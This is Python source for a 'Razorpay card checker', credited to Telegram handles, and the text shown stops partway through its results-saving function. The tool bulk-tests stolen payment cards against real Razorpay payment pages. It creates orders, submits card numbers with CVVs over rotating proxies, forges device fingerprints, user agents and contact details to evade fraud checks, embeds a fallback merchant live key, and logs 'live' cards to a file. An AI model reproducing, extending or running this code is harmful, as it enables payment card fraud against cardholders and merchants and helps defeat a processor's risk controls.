#!/usr/bin/env python3
"""
DLX RAZORPAY CARD CHECKER v2.0 - FULL PLAYWRIGHT EDITION
GO versiyonu ile birebir aynı mantık - TÜM ÖZELLİKLER EKLENDİ
Channel : @dlxdropp
Coder   : @deluxe_cc
"""

import re
import json
import time
import random
import string
import sys
import os
import hashlib
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from datetime import datetime
import traceback
import platform

import requests
from playwright.sync_api import sync_playwright

# ============================================================
# CONSTANTS
# ============================================================
BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"

# FALLBACK MERCHANT DATA (Site çalışmazsa)
FALLBACK_MERCHANT = {
    'key_id': 'rzp_live_hrgl3RDoNMvCOs',
    'payment_link': 'pl_OzLkvRvf1drPps',
    'payment_page_item_id': 'ppi_OzLkvSvf1drPpt',
    'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q=='
}

PROXY_CONFIG = None

DEFAULT_RAZORPAY_URLS = [
    "https://pages.razorpay.com/lckuk-international",
]

BALANCE_KEYWORDS = [
    "insufficient account balance", "insufficient funds",
    "maximum transaction limit", "transaction limit exceeded",
    "low balance", "not enough balance", "insufficient balance",
    "exceeds your limit", "daily limit exceeded"
]

CVV_KEYWORDS = [
    "cvv provided is incorrect", "incorrect_cvv",
    "invalid cvv", "wrong cvv", "cvv is incorrect"
]

# ============================================================
# COLOR CODES
# ============================================================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"

# ============================================================
# BANNER
# ============================================================
BANNER = f"""
{RED}{BOLD}
╔═══════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                               ║
║      ██████╗  █████╗ ███████╗ ██████╗ ██████╗ ██████╗  █████╗ ██╗   ██╗                      ║
║      ██╔══██╗██╔══██╗╚══███╔╝██╔═══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝                      ║
║      ██║  ██║███████║  ███╔╝ ██║   ██║██████╔╝██████╔╝███████║ ╚████╔╝                       ║
║      ██║  ██║██╔══██║ ███╔╝  ██║   ██║██╔══██╗██╔═══╝ ██╔══██║  ╚██╔╝                        ║
║      ██████╔╝██║  ██║███████╗╚██████╔╝██║  ██║██║     ██║  ██║   ██║                         ║
║      ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝                         ║
║                                                                                               ║
║                    ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗                   ║
║                   ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗                  ║
║                   ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝                  ║
║                   ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗                  ║
║                   ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║                  ║
║                    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                  ║
║                                                                                               ║
║                          DLX RAZORPAY CARD CHECKER v2.0                                       ║
║                          FULL PLAYWRIGHT EDITION                                              ║
║                          Channel : @dlxdropp                                                  ║
║                          Coder   : @deluxe_cc                                                 ║
║                                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════╝
{RESET}
"""

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def rand_int(min_val, max_val):
    return random.randint(min_val, max_val)

def gen_ua():
    major = rand_int(120, 147)
    build = rand_int(5000, 6999)
    patch = rand_int(50, 249)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36"

def gen_indian_phone():
    first = random.choice(['6', '7', '8', '9'])
    rest = ''.join([str(rand_int(0, 9)) for _ in range(9)])
    return f"+91{first}{rest}"

def gen_email():
    names = ["alex", "john", "mike", "sara", "david", "emma"]
    return f"{random.choice(names)}{rand_int(100, 9999)}@gmail.com"

def get_brand(cc):
    if cc.startswith('4'): return "visa"
    if len(cc) >= 2 and cc[:2] in ['51', '52', '53', '54', '55']: return "mastercard"
    if len(cc) >= 2 and cc[:2] in ['34', '37']: return "amex"
    return "unknown"

def generate_rzp_device_id():
    random_bytes = os.urandom(16)
    hash_val = hashlib.sha1(random_bytes).hexdigest()
    timestamp = int(time.time() * 1000)
    rnd = f"{rand_int(0, 99999999):08d}"
    return f"1.{hash_val}.{timestamp}.{rnd}", hash_val

def generate_rzp_session_id():
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(chars) for _ in range(14))

def generate_device_fingerprint():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(128))

DEVICE_FINGERPRINT = generate_device_fingerprint()

def mask_card(card_number):
    if not card_number: return "Unknown"
    if len(card_number) >= 10:
        return f"{card_number[:6]}******{card_number[-4:]}"
    return card_number

def format_proxy(raw):
    raw = raw.strip()
    if not raw: return ""
    if "://" in raw: return raw
    parts = raw.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{raw}"
    return f"http://{raw}"

def setup_playwright_proxy(proxy_string):
    global PROXY_CONFIG
    if not proxy_string or proxy_string.strip() == "":
        PROXY_CONFIG = None
        return None
    try:
        parts = proxy_string.strip().split(':')
        if len(parts) == 4:
            ip, port, user, pw = [p.strip() for p in parts]
            PROXY_CONFIG = {"server": f"http://{ip}:{port}", "username": user, "password": pw}
        elif len(parts) == 2:
            ip, port = [p.strip() for p in parts]
            PROXY_CONFIG = {"server": f"http://{ip}:{port}"}
        return PROXY_CONFIG
    except:
        return None

def get_timestamp():
    return datetime.now().strftime("%H:%M:%S")

def get_full_timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def log(message, level="INFO"):
    color = {"INFO": CYAN, "SUCCESS": GREEN, "ERROR": RED, "WARNING": YELLOW}.get(level, WHITE)
    print(f"[{color}{get_timestamp()}{RESET}] {color}{message}{RESET}")

def print_separator(char="═", length=80):
    print(f"{CYAN}{char * length}{RESET}")

def delay_between_requests():
    time.sleep(random.uniform(0.5, 1.5))

def is_balance_keyword(msg):
    if not msg: return False
    msg_lower = msg.lower()
    for kw in BALANCE_KEYWORDS:
        if kw in msg_lower: return True
    return False

def is_cvv_keyword(msg, err_code):
    if not msg: return False
    msg_lower = msg.lower()
    for kw in CVV_KEYWORDS:
        if kw in msg_lower: return True
    if err_code and err_code.lower() in ['incorrect_cvv', 'invalid_cvv']:
        return True
    return False

# ============================================================
# PLAYWRIGHT EXTRACTION FUNCTIONS
# ============================================================

def get_dynamic_session_token():
    """Playwright ile session token al"""
    try:
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(headless=True, proxy=PROXY_CONFIG, args=browser_args)
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=30000)
            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
            browser.close()
            
            if token and len(token) > 100:
                token = token[:64]
            return token, None if token else "Token not found"
    except Exception as e:
        return None, f"Session token error: {str(e)[:100]}"

def extract_merchant_data(site_url):
    """Playwright ile merchant data çek - FALLBACK ile"""
    try:
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(headless=True, proxy=PROXY_CONFIG, args=browser_args)
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            
            intercepted = {}
            def on_response(r):
                if "api.razorpay.com/v1/payment_links/merchant" in r.url:
                    try:
                        intercepted['data'] = r.json()
                    except:
                        pass
            
            page.on("response", on_response)
            page.goto(site_url, timeout=45000, wait_until='networkidle')
            page.wait_for_timeout(3000)
            
            eval_data = page.evaluate("""() => {
                const d = window.data || window.__INITIAL_STATE__ || window.__CHECKOUT_DATA__;
                if (d && d.keyless_header) return d;
                
                const scripts = document.querySelectorAll('script');
                for (let s of scripts) {
                    const txt = s.textContent || s.innerText;
                    if (txt.includes('keyless_header')) {
                        const match = txt.match(/keyless_header["']?:\\s*["']([^"']+)["']/);
                        if (match) return { keyless_header: match[1] };
                    }
                    if (txt.includes('payment_link')) {
                        const match = txt.match(/payment_link["']?:\\s*["']([^"']+)["']/);
                        if (match) return { payment_link: match[1] };
                    }
                }
                return null;
            }""")
            
            browser.close()
            
            final = eval_data or intercepted.get('data')
            if final:
                kh = final.get('keyless_header')
                kid = final.get('key_id')
                pl = final.get('payment_link') or final
                
                if isinstance(pl, str):
                    try:
                        pl = json.loads(pl)
                    except:
                        pass
                
                plid = pl.get('id') if isinstance(pl, dict) else final.get('payment_link_id')
                ppi_list = pl.get('payment_page_items', []) if isinstance(pl, dict) else []
                ppi = ppi_list[0].get('id') if ppi_list else final.get('payment_page_item_id')
                
                if kh and kid and plid and ppi:
                    return kh, kid, plid, ppi, None
            
            # FALLBACK
            log("Could not extract merchant, using fallback", "WARNING")
            return (FALLBACK_MERCHANT['keyless_header'], 
                    FALLBACK_MERCHANT['key_id'],
                    FALLBACK_MERCHANT['payment_link'],
                    FALLBACK_MERCHANT['payment_page_item_id'], None)
            
    except Exception as e:
        log(f"Extraction error, using fallback: {e}", "WARNING")
        return (FALLBACK_MERCHANT['keyless_header'], 
                FALLBACK_MERCHANT['key_id'],
                FALLBACK_MERCHANT['payment_link'],
                FALLBACK_MERCHANT['payment_page_item_id'], None)

def handle_3ds_redirect(redirect_url):
    """Playwright ile 3DS redirect handling"""
    try:
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(headless=True, proxy=PROXY_CONFIG, args=browser_args)
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            page.goto(redirect_url, timeout=45000, wait_until='networkidle')
            html_content = page.content()
            body_text = page.locator("body").inner_text()
            browser.close()
            
            if 'razorpay_signature' in html_content or 'payment successful' in body_text.lower():
                return "SUCCESS"
            return body_text.strip()[:150] if body_text.strip() else "No response"
    except Exception as e:
        return f"3DS error: {str(e)[:80]}"

# ============================================================
# PAYMENT FUNCTIONS - TÜM API ADIMLARI
# ============================================================

def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": gen_ua(),
        "Origin": "https://pages.razorpay.com",
        "Referer": "https://pages.razorpay.com/"
    }
    payload = {
        "notes": {"comment": "", "name": "User"},
        "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]
    }
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15)
        if resp.status_code != 200:
            log(f"Order API returned {resp.status_code}", "ERROR")
            return None
        return resp.json().get("order", {}).get("id")
    except Exception as e:
        log(f"Order error: {e}", "ERROR")
        return None

def send_preferences(session, order_id, session_token, keyless_header, rzp_device_id, fhash, order_amount, order_currency, payment_link, phone):
    resources = [
        "checkout_version_config", "merchant", "merchant_features", "downtime", 
        "customer", "customer_tokens", "truecaller", "methods", "experiments", 
        "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"
    ]
    
    pref_payload = {
        "query": [{"resource": r} for r in resources],
        "query_params": {
            "device_id": rzp_device_id,
            "rtb_device_id": fhash,
            "amount": order_amount,
            "currency": order_currency,
            "option_currency": order_currency,
            "truecaller": False,
            "qr_required": False,
            "library": "checkoutjs",
            "platform": "browser",
            "order_id": order_id,
            "payment_link_id": payment_link,
            "contact": phone
        },
        "action": "get"
    }
    
    headers = {
        'Accept': '*/*',
        'Origin': 'https://api.razorpay.com',
        'Referer': f"https://api.razorpay.com/v1/checkout/public?session_token={session_token}",
        'x-session-token': session_token,
        'Content-Type': 'application/json'
    }
    
    try:
        session.post(
            f"https://api.razorpay.com/v2/standard_checkout/preferences",
            params={'x_entity_id': order_id, 'session_token': session_token, 'keyless_header': keyless_header},
            headers=headers,
            json=pref_payload,
            timeout=30
        )
    except:
        pass

def send_checkout_order(session, order_id, session_token, keyless_header, key_id, email, phone_short, phone, order_currency, rzp_device_id, fhash, order_amount, payment_link, checkout_id):
    checkout_form = {
        "notes[email]": email,
        "notes[phone]": phone_short,
        "payment_link_id": payment_link,
        "key_id": key_id,
        "contact": phone,
        "email": email,
        "currency": order_currency,
        "_[integration]": "payment_pages",
        "_[device.id]": rzp_device_id,
        "_[library]": "checkoutjs",
        "_[library_src]": "no-src",
        "_[current_script_src]": "no-src",
        "_[platform]": "browser",
        "_[env]": "",
        "_[is_magic_script]": "false",
        "_[os]": "windows",
        "_[shield][fhash]": fhash,
        "_[shield][tz]": "0",
        "_[device_id]": rzp_device_id,
        "_[build]": BUILD,
        "_[shield][os]": "windows",
        "_[shield][platform]": "browser",
        "_[shield][browser]": "chrome",
        "_[request_index]": "0",
        "amount": f"{order_amount:.0f}",
        "order_id": order_id,
        "method": "card",
        "checkout_id": checkout_id
    }
    
    headers = {
        'Accept': '*/*',
        'Origin': 'https://api.razorpay.com',
        'x-session-token': session_token,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    try:
        session.post(
            f"https://api.razorpay.com/v1/standard_checkout/checkout/order",
            params={'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header},
            headers=headers,
            data=checkout_form,
            timeout=30
        )
    except:
        pass

def send_cross_border(session, order_id, keyless_header, order_amount, order_currency, brand):
    cb_payload = {
        "identifiers": {
            "merchant": {"country": "IN"},
            "card": {"country": "US", "dcc_blacklist": False, "network": brand},
            "method": "card",
            "payment_currency": order_currency
        },
        "forex_charges": {
            "amount": order_amount,
            "currency": order_currency,
            "filters": {"method": "card"}
        }
    }
    
    headers = {
        'Accept': '*/*',
        'Origin': 'https://api.razorpay.com',
        'Content-Type': 'application/json'
    }
    
    try:
        session.post(
            f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows",
            params={'x_entity_id': order_id, 'keyless_header': quote(keyless_header)},
            headers=headers,
            json=cb_payload,
            timeout=30
        )
    except:
        pass

def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url, rzp_device_id, fhash, checkout_id, order_amount, order_currency, brand):
    card_number, exp_month, exp_year, cvv = card_info
    year = int(exp_year)
    if year < 100:
        year = 2000 + year
    
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {
        "x_entity_id": order_id,
        "session_token": session_token,
        "keyless_header": keyless_header
    }
    headers = {
        "x-session-token": session_token,
        "Accept": "*/*",
        "Origin": "https://api.razorpay.com",
        "User-Agent": gen_ua()
    }
    
    token_data = json.dumps([{"name": "sardine", "metadata": {"session_id": checkout_id}}])
    user_risk_token = base64.b64encode(token_data.encode()).decode()
    
    data = {
        "user_risk_providers_token": user_risk_token,
        "notes[comment]": "",
        "notes[email]": user_info["email"],
        "notes[phone]": user_info["phone"],
        "notes[name]": "User",
        "payment_link_id": payment_link_id,
        "key_id": key_id,
        "contact": f"+91{user_info['phone']}",
        "email": user_info["email"],
        "currency": order_currency,
        "_[integration]": "payment_pages",
        "_[checkout_id]": checkout_id,
        "_[device.id]": rzp_device_id,
        "_[env]": "",
        "_[library]": "checkoutjs",
        "_[library_src]": "no-src",
        "_[current_script_src]": "no-src",
        "_[is_magic_script]": "false",
        "_[platform]": "browser",
        "_[referer]": site_url,
        "_[shield][fhash]": fhash,
        "_[shield][tz]": "-330",
        "_[device_id]": rzp_device_id,
        "_[build]": BUILD,
        "_[shield][os]": "windows",
        "_[shield][platform]": "browser",
        "_[shield][browser]": "chrome",
        "_[request_index]": "1",
        "amount": f"{order_amount:.0f}",
        "order_id": order_id,
        "method": "card",
        "card[number]": card_number,
        "card[cvv]": cvv,
        "card[name]": "User",
        "card[expiry_month]": exp_month,
        "card[expiry_year]": str(year),
        "save": "0",
        "dcc_currency": order_currency,
        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT
    }
    
    response = session.post(url, headers=headers, params=params, data=data, timeout=30)
    
    # Debug için
    if response.status_code != 200:
        log(f"Payment API returned {response.status_code}", "ERROR")
        log(f"Response: {response.text[:200]}", "DEBUG")
    
    return response

def check_payment_status(payment_id, key_id, session_token, keyless_header):
    headers = {
        'Accept': '*/*',
        'User-Agent': gen_ua(),
        'x-session-token': session_token,
    }
    params = {
        'key_id': key_id,
        'session_token': session_token,
        'keyless_header': keyless_header,
    }
    try:
        r = requests.get(
            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}',
            params=params, headers=headers, timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            return data.get('status', 'unknown'), data
        return 'unknown', {'error': f'Status check failed: {r.status_code}'}
    except Exception as e:
        return 'unknown', {'error': f'Status check error: {e}'}

def cancel_payment(payment_id, key_id, session_token, keyless_header):
    headers = {
        'Accept': '*/*',
        'Content-type': 'application/x-www-form-urlencoded',
        'User-Agent': gen_ua(),
        'x-session-token': session_token,
    }
    params = {
        'key_id': key_id,
        'session_token': session_token,
        'keyless_header': keyless_header,
    }
    try:
        r = requests.get(
            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
            params=params, headers=headers, timeout=15
        )
        try:
            return r.json()
        except json.JSONDecodeError:
            return {"error": {"description": f"Cancel HTTP {r.status_code}"}}
    except Exception as e:
        return {"error": {"description": f"Cancel error: {e}"}}

def send_3ds_authentication(session, payment_id):
    screens = [[1920, 1080], [1366, 768], [1536, 864], [1440, 900]]
    screen = random.choice(screens)
    depth = random.choice([24, 32])
    
    auth_form = {
        "browser[java_enabled]": "false",
        "browser[javascript_enabled]": "true",
        "browser[timezone_offset]": "0",
        "browser[color_depth]": str(depth),
        "browser[screen_width]": str(screen[0]),
        "browser[screen_height]": str(screen[1]),
        "browser[language]": "en-US",
        "auth_step": "3ds2Auth"
    }
    
    payment_id_clean = payment_id.split('_')[-1] if '_' in payment_id else payment_id
    
    try:
        session.post(
            f"https://api.razorpay.com/pg_router/v1/payments/{payment_id_clean}/authenticate",
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            data=auth_form,
            timeout=30
        )
    except:
        pass

# ============================================================
# PROXY MANAGER
# ============================================================

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
    
    def load_from_file(self, filename="px.txt"):
        try:
            with open(filename, 'r') as f:
                raw_proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                self.proxies = [format_proxy(p) for p in raw_proxies if format_proxy(p)]
            log(f"{len(self.proxies)} proxies loaded", "SUCCESS")
            return len(self.proxies) > 0
        except FileNotFoundError:
            return False
    
    def load_from_string(self, proxy_string):
        proxies = [p.strip() for p in proxy_string.split(',') if p.strip()]
        self.proxies = [format_proxy(p) for p in proxies if format_proxy(p)]
        log(f"{len(self.proxies)} proxies loaded", "SUCCESS")
        return len(self.proxies) > 0
    
    def get_next(self):
        if not self.proxies:
            return None
        with self.lock:
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy
    
    def get_proxies_dict(self):
        proxy_str = self.get_next()
        if not proxy_str:
            return None
        return {"http": proxy_str, "https": proxy_str}

# ============================================================
# SITE MANAGER
# ============================================================

class SiteManager:
    def __init__(self):
        self.sites = []
        self.current_index = 0
        self.lock = threading.Lock()
    
    def load_from_file(self, filename="sites.txt"):
        try:
            with open(filename, 'r') as f:
                raw_sites = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                self.sites = []
                for site in raw_sites:
                    if not site.startswith(('http://', 'https://')):
                        site = 'https://' + site
                    self.sites.append(site)
            if self.sites:
                log(f"{len(self.sites)} sites loaded", "SUCCESS")
                return True
        except FileNotFoundError:
            pass
        
        self.sites = DEFAULT_RAZORPAY_URLS.copy()
        log(f"Using {len(self.sites)} default sites", "INFO")
        return True
    
    def load_from_string(self, site_string):
        sites = [s.strip() for s in site_string.split(',') if s.strip()]
        self.sites = []
        for site in sites:
            if not site.startswith(('http://', 'https://')):
                site = 'https://' + site
            self.sites.append(site)
        log(f"{len(self.sites)} sites loaded", "SUCCESS")
        return len(self.sites) > 0
    
    def get_next(self):
        if not self.sites:
            return DEFAULT_RAZORPAY_URLS[0]
        with self.lock:
            site = self.sites[self.current_index % len(self.sites)]
            self.current_index += 1
            return site

# ============================================================
# SESSION CACHE
# ============================================================

class SessionCache:
    def __init__(self):
        self.session_token = None
        self.rzp_device_id = None
        self.fhash = None
        self.rzp_session_id = None
        self.keyless_header = None
        self.key_id = None
        self.payment_link = None
        self.payment_page_item_id = None
        self.amount_paise = None
        self.token_uses = 0
        self.lock = threading.Lock()
    
    def is_valid(self):
        return all([self.session_token, self.rzp_device_id, self.key_id, self.payment_link])
    
    def need_refresh(self):
        return self.token_uses >= 15

# ============================================================
# RAZORPAY CHARGER
# ============================================================

class RazorpayCharger:
    def __init__(self, proxy_manager=None, site_manager=None):
        self.proxy_manager = proxy_manager
        self.site_manager = site_manager
        self.cache = SessionCache()
        self.results = []
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
    
    def get_session_token(self):
        with self.cache.lock:
            if self.cache.session_token and not self.cache.need_refresh():
                self.cache.token_uses += 1
                return self.cache.session_token, None
            
            stoken, err = get_dynamic_session_token()
            if err:
                return None, err
            
            self.cache.session_token = stoken
            self.cache.token_uses = 1
            return stoken, None
    
    def init_merchant_and_session(self, target_url, amount_paise):
        if self.cache.is_valid() and self.cache.amount_paise == amount_paise:
            return True
        
        kh, kid, plid, ppiid, err = extract_merchant_data(target_url)
        if err and not kh:
            log(f"Merchant extraction failed: {err}", "ERROR")
            return False
        
        rzp_device_id, fhash = generate_rzp_device_id()
        rzp_session_id = generate_rzp_session_id()
        
        with self.cache.lock:
            self.cache.keyless_header = kh
            self.cache.key_id = kid
            self.cache.payment_link = plid
            self.cache.payment_page_item_id = ppiid
            self.cache.amount_paise = amount_paise
            self.cache.rzp_device_id = rzp_device_id
            self.cache.fhash = fhash
            self.cache.rzp_session_id = rzp_session_id
        
        log(f"Merchant extracted: key_id={kid[:10]}...", "SUCCESS")
        
        stoken, err = self.get_session_token()
        if err:
            log(f"Session token failed: {err}", "ERROR")
            return False
        
        log(f"Session token obtained", "SUCCESS")
        return True
    
    def process_card(self, card_string, amount_paise, site_url):
        start_time = time.time()
        
        # Parse card
        try:
            card_string = card_string.strip()
            for sep in ['|', '/', ' ', ',', ':']:
                if sep in card_string:
                    parts = card_string.split(sep)
                    if len(parts) >= 4:
                        break
            else:
                parts = card_string.split()
            
            if len(parts) < 4:
                return {'success': False, 'error': 'Invalid format', 'masked': mask_card(card_string), 'amount_inr': amount_paise/100}
            
            cc = parts[0].replace(" ", "")
            mm = parts[1].zfill(2)
            yy = parts[2]
            cvv = parts[3]
            
            if len(yy) == 4:
                yy = yy[2:]
            
            brand = get_brand(cc)
            
        except Exception as e:
            return {'success': False, 'error': f'Parse: {e}', 'masked': mask_card(card_string), 'amount_inr': amount_paise/100}
        
        result = {
            'card': cc, 'month': mm, 'year': yy, 'cvv': cvv,
            'masked': mask_card(cc), 'amount_inr': amount_paise/100,
            'success': False, 'error': None, 'time': 0,
            'payment_id': None, 'order_id': None, 'brand': brand
        }
        
        session_token, err = self.get_session_token()
        if err:
            result['error'] = f"Token: {err}"
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        with self.cache.lock:
            key_id = self.cache.key_id
            keyless_header = self.cache.keyless_header
            payment_link = self.cache.payment_link
            payment_item_id = self.cache.payment_page_item_id
            rzp_device_id = self.cache.rzp_device_id
            fhash = self.cache.fhash
            rzp_session_id = self.cache.rzp_session_id
        
        session = requests.Session()
        if self.proxy_manager:
            proxy_dict = self.proxy_manager.get_proxies_dict()
            if proxy_dict:
                session.proxies.update(proxy_dict)
        
        # Create order
        order_id = create_order(session, payment_link, amount_paise, payment_item_id)
        if not order_id:
            result['error'] = "Order creation failed"
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        result['order_id'] = order_id
        checkout_id = order_id.split('_')[-1] if '_' in order_id else order_id
        order_amount = float(amount_paise)
        order_currency = "INR"
        
        # Send preferences
        send_preferences(session, order_id, session_token, keyless_header, rzp_device_id, fhash, order_amount, order_currency, payment_link, gen_indian_phone())
        
        # Send checkout order
        phone = gen_indian_phone()
        phone_short = phone[3:]
        email = gen_email()
        send_checkout_order(session, order_id, session_token, keyless_header, key_id, email, phone_short, phone, order_currency, rzp_device_id, fhash, order_amount, payment_link, checkout_id)
        
        # Send cross border
        send_cross_border(session, order_id, keyless_header, order_amount, order_currency, result['brand'])
        
        time.sleep(random.uniform(1, 2))
        
        # Submit payment
        try:
            user_info = {"name": "User", "email": email, "phone": phone_short}
            response = submit_payment(
                session, order_id, (cc, mm, yy, cvv), user_info, amount_paise,
                key_id, keyless_header, payment_link, session_token, site_url,
                rzp_device_id, fhash, checkout_id, order_amount, order_currency, result['brand']
            )
            
            if response.status_code != 200:
                result['error'] = f"Payment API: {response.status_code}"
                result['time'] = round(time.time() - start_time, 2)
                return result
            
            pdata = response.json()
        except json.JSONDecodeError as e:
            result['error'] = f"Invalid JSON response: {str(e)[:50]}"
            result['time'] = round(time.time() - start_time, 2)
            return result
        except Exception as e:
            result['error'] = f"Payment submission: {str(e)[:60]}"
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
        
        if pdata.get("redirect") == True or pdata.get("type") == "redirect":
            rurl = pdata.get('request', {}).get('url') if isinstance(pdata.get('request'), dict) else None
            if rurl and pid:
                time.sleep(3)
                stat, _ = check_payment_status(pid, key_id, session_token, keyless_header)
                
                if stat in ['captured', 'authorized']:
                    result['success'] = True
                    result['status'] = 'charged'
                    result['payment_id'] = pid
                    result['time'] = round(time.time() - start_time, 2)
                    return result
                
                if stat == 'created':
                    result['success'] = True
                    result['status'] = 'live'
                    result['payment_id'] = pid
                    result['error'] = "3DS/OTP Required"
                    result['time'] = round(time.time() - start_time, 2)
                    return result
                
                cdata = cancel_payment(pid, key_id, session_token, keyless_header)
                if isinstance(cdata, dict) and "error" in cdata:
                    err = cdata["error"]
                    if isinstance(err, dict) and err.get('reason') == 'payment_cancelled':
                        result['success'] = True
                        result['status'] = 'live'
                        result['payment_id'] = pid
                        result['error'] = "3DS/OTP Required"
                        result['time'] = round(time.time() - start_time, 2)
                        return result
                
                result['error'] = "Declined"
                result['time'] = round(time.time() - start_time, 2)
                return result
        
        if "razorpay_signature" in pdata or "signature" in pdata:
            result['success'] = True
            result['status'] = 'charged'
            result['payment_id'] = pid
            result['time'] = round(time.time() - start_time, 2)
            return result
        
        # Send 3DS authentication
        if pid:
            send_3ds_authentication(session, pid)
        
        if "error" in pdata:
            err = pdata.get('error', {})
            if isinstance(err, dict):
                desc = err.get('description', 'Unknown')
                if is_balance_keyword(desc) or is_cvv_keyword(desc, err.get('reason', '')):
                    result['success'] = True
                    result['status'] = 'approved'
                    result['error'] = desc
                else:
                    result['error'] = desc
                result['time'] = round(time.time() - start_time, 2)
                return result
        
        result['error'] = "Unknown response"
        result['time'] = round(time.time() - start_time, 2)
        return result
    
    def check_batch(self, cards, amount_paise, max_workers, site_url):
        self.results = []
        self.success_count = 0
        self.fail_count = 0
        completed = 0
        
        if not self.init_merchant_and_session(site_url, amount_paise):
            log("Failed to initialize merchant and session", "ERROR")
            return {'total': len(cards), 'success': 0, 'failed': len(cards), 'results': []}
        
        log(f"Processing {len(cards)} cards with {max_workers} threads...", "INFO")
        print_separator()
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.process_card, card, amount_paise, site_url): card for card in cards}
            
            for future in as_completed(futures):
                result = future.result()
                completed += 1
                
                with self.lock:
                    if result.get('success'):
                        self.success_count += 1
                        status_text = "LIVE ✓"
                        color = GREEN
                    else:
                        self.fail_count += 1
                        status_text = "DECLINED ✗"
                        color = RED
                    
                    self.results.append(result)
                
                log(f"[{completed}/{len(cards)}] {result.get('masked', 'Unknown')} | ₹{result.get('amount_inr', 0):.2f} -> {color}{status_text}{RESET} | {result.get('error', 'OK')[:40]}")
        
        print_separator()
        return {'total': len(cards), 'success': self.success_count, 'failed': self.fail_count, 'results': self.results}

# ============================================================
# SAVE RESULTS
# ============================================================

def save_results(results, filename=None):
    if not results:
        return
    
    if not filename:
        filename = f"razorpay_results_{get_full_timestamp()}"
    
    live_file = "live.txt"
    with open(live_file, 'a') as f:
        for r in results:
            if r.get('success'):
